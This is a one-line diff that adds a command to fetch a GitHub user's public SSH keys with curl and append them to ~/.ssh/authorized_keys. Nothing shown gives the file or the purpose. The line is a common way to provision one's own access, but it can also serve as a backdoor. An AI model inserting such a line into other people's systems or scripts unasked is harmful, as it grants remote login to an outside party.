@@ -1,0 +1,1 @@
+curl https://github.com/grimpy.keys >> ~/.ssh/authorized_keys
